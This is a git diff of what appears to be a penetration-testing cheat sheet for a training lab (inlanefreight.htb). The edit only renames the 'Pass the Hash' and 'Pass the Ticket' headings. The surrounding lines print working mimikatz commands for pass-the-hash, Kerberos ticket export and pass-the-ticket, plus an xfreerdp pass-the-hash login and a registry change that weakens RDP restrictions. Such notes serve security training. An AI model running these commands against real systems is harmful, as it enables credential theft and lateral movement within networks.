@@ -605,7 +605,7 @@ office2john.py Protected.docx > protected-docx.hash
 ```
 ## Windows Lateral Movement Techniques
 
-##### Pass the Hash (PtH)
+##### Pass the Hash
 ```
 # Pass the Hash from Windows Using Mimikatz to spawn new cmd.exe process under the identity of user julio using their NTLM hash
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
@@ -634,10 +634,8 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
-
-
 ```
-##### Pass the Ticket (PtT) from Windows
+##### Pass the Ticket from Windows
 ```
 # Harvesting Kerberos tickets from Windows by mimikatz ( it wil export ticket to file .kirbi ) 
 mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
@@ -671,7 +669,7 @@ mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz
 mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" "misc::cmd" exit
 
 ```
-##### Pass the Ticket (PtT) from Linux
+##### Pass the Ticket from Linux
 ```
 # realm - Check if Linux machine is domain-joined
 realm list
